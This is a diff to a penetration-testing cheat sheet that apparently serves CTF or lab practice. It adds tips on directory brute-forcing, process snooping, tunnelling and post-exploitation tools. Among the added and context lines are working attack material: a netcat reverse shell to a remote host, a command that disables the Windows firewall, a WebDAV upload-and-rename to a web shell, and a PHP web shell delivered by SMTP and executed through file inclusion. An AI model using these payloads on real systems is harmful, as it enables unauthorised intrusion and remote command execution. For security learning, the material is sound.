@@ -233,6 +233,8 @@ Example:
  scanme.nmap.org has address 45.33.32.156
  scanme.nmap.org has IPv6 address 2600:3c01::f03c:91ff:fe18:bb2f
 
+.. Tip :: Usually, DNS runs on UDP Port. However, If DNS is running on TCP port, probably DNS Zone Transfer would be possible.
+
 SSL Certificate
 ---------------
 
@@ -347,12 +349,14 @@ Furthermore, we can run the following programs to find any hidden directories.
 * `DIRB <https://tools.kali.org/web-applications/dirb>`_ is a Web Content Scanner. It looks for existing (and/ or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analysing the response.
 * `wfuzz <https://tools.kali.org/web-applications/wfuzz>`_ - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let's say, when we dirb we get 50 directories. Each directory containing an image. Often, we then need to figure out which image is different. In this case, we would figure out what's the size of the normal image and hide that particular response with wfuzz.
 * `Dirbuster <https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project>`_ : DirBuster is a multi threaded java application designed to brute force directories and files names on web/ application servers. 
+* `gobuster <https://github.com/OJ/gobuster>`_ : Gobuster is a tool used to brute-force URIs (directories and files) in web sites and DNS subdomains (with wildcard support). (golang can be installed using apt-get).
+
 
 .. Tip :: Most likely, we will be using common.txt (/usr/share/wordlists/dirb/) . If it's doesn't find anything, it's better to double check with /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt which is a list of directories that where found on at least 2 different hosts when DirBuster project crawled the internet. Even if that doesn't work out, try searching with extensions such as .txt, .js, .html, .php. (.txt by default and rest application based)
 
 .. Tip :: If using the dirb/ wfuzz wordlist doesn't result in any directories and the website contains a lot of text, it might be a good idea to use cewl to create a wordlist and utilize that as a dictionary to find hidden directories. Also, it sometimes make sense to dirb/wfuzz the IPAddress instead of the hostname like filesrv.example.com (Maybe found by automatic redirect)
 
-.. Todo:: add Gobuster?
+.. Tip :: It's important to know that dirb shows the directories found based on the response code, so if a web-application shows 404 status code instead of 200, dirbuster would miss it. In that case, wfuzz or gobuster or Burpsuite would help as they check for response length too.
 
 BurpSuite Spider
 ^^^^^^^^^^^^^^^^
@@ -466,6 +470,7 @@ We can also use wpscan to bruteforce passwords for a given username
 
 **Tips**
 
+* wpscan scans the themes, plugins by passive scanning, if we are not finding anything, it might be good idea to do scanning with all plugins (ap) and all themes (at). Sometimes, plugin may fake their version, so probably, good idea to readme and check for vulns.
 * If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible ways is to go to Appearance > Editor > Edit 404 Template.
 * The configuration of worpdress is normally speaking stored in **wp-config.php**. If you are able to download it, you might be lucky and be able to loot plaintext username and passwords to the database or wp-admin page. 
 * If the website is vulnerable for SQL-Injection. We should be able to extract the wordpress users and their password hashes. However, if the password hash is not crackable. Probably, check the wp-posts table as it might contain some hidden posts.
@@ -553,6 +558,8 @@ Once we have figured out some vulnerability or misconfiguration in a running ser
 netcat (nc)
 ^^^^^^^^^^^
 
+TCP Mode
+
 * with the -e option
 
  ::
@@ -566,6 +573,23 @@ netcat (nc)
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 
 .. Tip :: f in this case is a file name, if you want to have more then one reverse shell with this method you will have to use another letter (a ... z) then the one you used intially. 
+
+UDP Mode
+
+Just use the UDP Mode (-u)
+
+::
+
+ nc -h
+ [v1.10-41.1]
+ connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
+ listen for inbound:	nc -l -p port [-options] [hostname] [port]
+ options:
+	-l			listen mode, for inbound connects
+	-n			numeric-only IP addresses, no DNS
+	-p port			local port number
+	-u			UDP mode
+
 
 PHP
 ^^^
@@ -2048,6 +2072,13 @@ Cron.d
 
 Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.
 
+pspy
+^^^^
+
+`pspy - unprivileged linux process snooping <https://github.com/DominicBreuker/pspy>`_  is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. 
+Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.
+
+The tool gathers it's info from procfs scans. Inotify watchers placed on selected parts of the file system trigger these scans to catch short-lived processes. It is a great tool to search for cron jobs running.
 
 Unattended APT - Upgrade
 ------------------------
@@ -2700,6 +2731,8 @@ Reading the hidden stream
 
  more < testfile.txt:hidden_stream::$DATA
 
+We may also utilze `List Alternate Data Streams <https://github.com/codejanus/ToolSuite/blob/master/lads.exe>`_ LADS tool to figure out Alternate Data Streams.
+
 Redirecting Standard Out and Standard Error from PowerShell Start-Process
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
@@ -3052,6 +3085,46 @@ and
    Scenario:
    * Attacker IP Network : 172.40.60.0/22; Attacker Current IP: 172.40.60.55 and Targetted IP: 172.16.96.2 (Possible SCADA Network - Natted IP)
    * As it's a industrial plant, there's a firewall between IT Network (172.40.60.0/22) and SCADA Network (Possible IP 172.16.96.2 -- This is NATTed IP)
+
+Plink
+-----
+
+Plink is a windows command-line connection tool similar to UNIX ssh. 
+
+::
+
+ plink
+ Plink: command-line connection utility
+ Release 0.68
+ Usage: plink [options] [user@]host [command]
+       ("host" can also be a PuTTY saved session name)
+ Options:
+  -V        print version information and exit
+  -v        show verbose messages
+  -load sessname  Load settings from saved session
+  -ssh -telnet -rlogin -raw -serial
+            force use of a particular protocol
+  -P port   connect to specified port
+  -l user   connect with specified username
+ The following options only apply to SSH connections:
+  -pw passw login with specified password
+  -D [listen-IP:]listen-port
+            Dynamic SOCKS-based port forwarding
+  -L [listen-IP:]listen-port:host:port
+            Forward local port to remote address
+  -R [listen-IP:]listen-port:host:port
+            Forward remote port to local address
+  -X -x     enable / disable X11 forwarding
+  -A -a     enable / disable agent forwarding
+  -t -T     enable / disable pty allocation
+  -C        enable compression
+  -i key    private key file for user authentication
+  -m file   read remote command(s) from file
+  -N        don't start a shell/command (SSH-2 only)
+  -nc host:port
+            open tunnel in place of session (SSH-2 only)
+
+It can also be used to perform SSH tunnelling, have a look at -L, -R and -D options. On Kali Linux box it is present at /usr/share/windows-binaries/plink.exe
 
 HTTP
 ----
@@ -3652,6 +3725,11 @@ Others
 
  .. ToDo ::  Mention examples for IPv6 connect
 
+* Disable windows firewall 
+
+  ::
+
+   netsh firewall set opmode disable
 
 * Port 139 Open
 
@@ -3706,6 +3784,7 @@ Others
 
    get or put file
 
+* Want to see what firewall rules are applied in Linux? Get /etc/iptables/rules.v4 and /etc/iptables/rules.v6 file. 
 	    
 * Ruby Best way to get quoted words / phrases out of the text
 
@@ -3899,7 +3978,13 @@ Others
   Executes: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
   Executes: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
  
- Now, we can see that pl, html, txt and other files can be uploaded. Now, if the MOVE method is enabled, we can upload a php meterpreter in a text file and then MOVE the .txt file to .php and execute the php file.
+ Now, we can see that pl, html, txt and other files can be uploaded. Now, if the MOVE method is enabled, we can upload a aspx meterpreter in a text file and then MOVE the .txt file to .aspx and execute the aspx file by using
+
+ ::
+
+  MOVE /shell.txt HTTP/1.1
+  Host: example.com
+  Destination: /shell.aspx
 
 * In one of the VM, one of the task was to capture the RAM of the system by using LiME ~ Linux Memory Extractor ( which is executed by suid binary with root privileges ). Let's say the ramdump was saved at
 
@@ -3965,6 +4050,26 @@ Others
 
 * If there's .action file present in the URL on a Apache WebServer, `Apache Struts <https://svn.apache.org/repos/asf/struts/archive/trunk/struts-doc-1.1/api/org/apache/struts/action/package-summary.html>`_ might be installed on it. Check for Apache Struts vulnerabilities on it.
 
+* Windows XP Machine ? and we are able to put some files anywhere? Refer `Playing with MOF files on Windows, for fun & profit <http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html>`_
+
+* Good Post Exploitation Guide `Windows Post-Exploitation Command List <http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf>`_
+
+* Oracle Padding Attacks? Refer `PadBuster <https://github.com/GDSSecurity/PadBuster>`_ 
+
+* If there's a cron job with 
+
+ ::
+
+  * * * * * php /path-to-your-project/artisan schedule:run >> /dev/null 2>&1
+
+ possibly, we can edit schedule method of the App\Console\Kernel class (Kernel.php) in App\Console\Kernel and use exec method to execute commands on the operating systems.
+
+ ::
+
+  $schedule->exec('node /home/forge/script.js')->daily();
+
+ Refer `Task Scheduling <https://laravel.com/docs/5.6/scheduling>`_ 
+
 * Handy Stuff
 
  * Utilize xxd to convert hex to ascii
@@ -3975,6 +4080,7 @@ Others
    -p | -ps | -postscript | -plain : output in postscript continuous hexdump style. Also known as plain hexdump style.
    -r | -revert : reverse operation: convert (or patch) hexdump into binary.  If not writing to stdout, xxd writes into its output file without truncating it. Use the combination -r -p to read plain hexadecimal dumps without line number information and without a particular column layout. Additional Whitespace and line-breaks are allowed anywhere.
 
+ * We may use base64 -w 0 to disable line wrapping while encoding files with base64.
  * Use python
 
   * binascii.unhexlify(hexstr) to convert hex to string
@@ -3993,6 +4099,13 @@ Others
     s = "6a48f82d8e828ce82b82"
     i = int(s, 16)
 
+  * If we are able to execute python code maybe use popen to execute os commands.
+   
+   ::
+
+    import os;
+    os.popen("whoami").read()
+    
  * Getting out of more
   
   If in somecase, we are unable to ssh into the machine or being logged out when trying ssh, check the /etc/passwd file for the shell defined for that user.
@@ -4072,6 +4185,10 @@ Useful Tools
 * `exe2hex <https://github.com/g0tmi1k/exe2hex>`_ : Inline file transfer using in-built Windows tools (DEBUG.exe or PowerShell). 
 
 * `Powercat <https://github.com/secabstraction/PowerCat>`_ : A PowerShell TCP/IP swiss army knife that works with Netcat & Ncat
+
+* `Unicorn <https://github.com/trustedsec/unicorn>`_ is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory.
+
+* `Nishang <https://github.com/samratashok/nishang>`_ is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming.
 
 .. _A1-Local-file-Inclusion:
 
@@ -4362,6 +4479,33 @@ The session file could again afterwards be included using the LFI (note that you
 
 Email Server 
 ^^^^^^^^^^^^
+
+If the email server allows you to send email unauthorized and we know the usernames on the system, we probably can utilize it to do remote code execution by using telnet and connecting to port 25
+
+::
+
+ EHLO example.com
+ VRFY username@example.com
+ MAIL FROM: pwned@domain.com
+ RCPT TO: username@example.com
+ DATA
+
+ Subject: Owned
+ <?php echo system($_REQUEST['cmd']); ?>
+
+ .
+
+ Mail Queued
+
+and as we have LFI, we can read the email by 
+
+::
+
+ ../../../var/mail/username &cmd=whoami
+
+The above would probably differ on the request of your LFI.
+
+
 
 .. _A2-File-Upload:
 
@@ -4979,8 +5123,8 @@ Installing tftp - Windows
 
 .. _A4-Linux-Group-Membership-Issues:
 
-Appendix-IV Linux Group Membership Issues?
-==========================================
+Appendix-IV Linux Group Membership Issues
+=========================================
 
 Let's examine in what groups we are members. Recommended read about groups: `Users and Groups <https://wiki.archlinux.org/index.php/users_and_groups>`_ and `System Groups <https://wiki.debian.org/SystemGroups>`_
 
@@ -5244,8 +5388,8 @@ At this point, we can write a ssh public key to the root/.ssh folder and use tha
 
 .. _A5-Coding-Languages-Tricks:
 
-Appendix-V Coding Languages Tricks?
-===================================
+Appendix-V Coding Languages Tricks
+==================================
 
 Python 
 ------
@@ -5353,17 +5497,44 @@ Type juggling in PHP is caused by an issue of loose operations versus strict ope
 
 So, if == or != is used to do the comparison or the password checks and if md5(of a string/number) results in a hash starting with 0e, there might be a possibility of bug.
 
-Refer `Magic Hashes <https://www.whitehatsec.com/blog/magic-hashes/>`_, `PHP Weak Typing Woes &#8212; With Some Pontification about Code and Pen Testing <https://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing#>`_ and `Writing Exploits For Exotic Bug Classes: 
+Refer `Magic Hashes <https://www.whitehatsec.com/blog/magic-hashes/>`_, `PHP Weak Typing Woes; With Some Pontification about Code and Pen Testing <https://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing#>`_ and `Writing Exploits For Exotic Bug Classes: 
 PHP Type Juggling <http://turbochaos.blogspot.com/2013/08/exploiting-exotic-bugs-php-type-juggling.html>`_ 
-
-
-
 
 LUA
 ---
 
 In Lua, when a developer uses unvalidated user data to run operating system commands via the os.execute() or io.popen() Lua functions, there can be command injection. A good paper to read is `Lua Web Application Security Vulnerabilities <http://seclists.org/fulldisclosure/2014/May/128>`_
 
+Appendix-VI Metasploit Module Writing?
+======================================
+
+.. Note :: This section is still under progress.
+
+* Creating a new module? create it in your home directory 
+
+  ::
+
+   mkdir -p $HOME/.msf4/modules/exploits
+
+ If you are using auxiliary or post modules, or are writing payloads you'll want to mkdir those as well.
+
+* Made some changes and want metasploit to pick up those changes? use
+
+  ::
+
+   msf > reload_all
+
+* Refer `Loading External Modules <https://github.com/rapid7/metasploit-framework/wiki/Loading-External-Modules>`_ for the above two points.
+
+* Want to edit a module or see the source code of it ? use edit in msfconsole (after selecting the module i.e use module_name)
+* Want to write some variable value (like the payload/ mof file) to a file? use
+
+ ::
+
+  File.Write('/path/to/file', 'Some glorious content')
+
+* Refer `Documentation for rapid7/metasploit-framework <https://www.rubydoc.info/github/rapid7/metasploit-framework/>`_
+* Refer `How to use WbemExec for a write privilege attack on Windows <https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows>`_ and `How to get started with writing an exploit <https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-an-exploit>`_
 
 Changelog
 =========
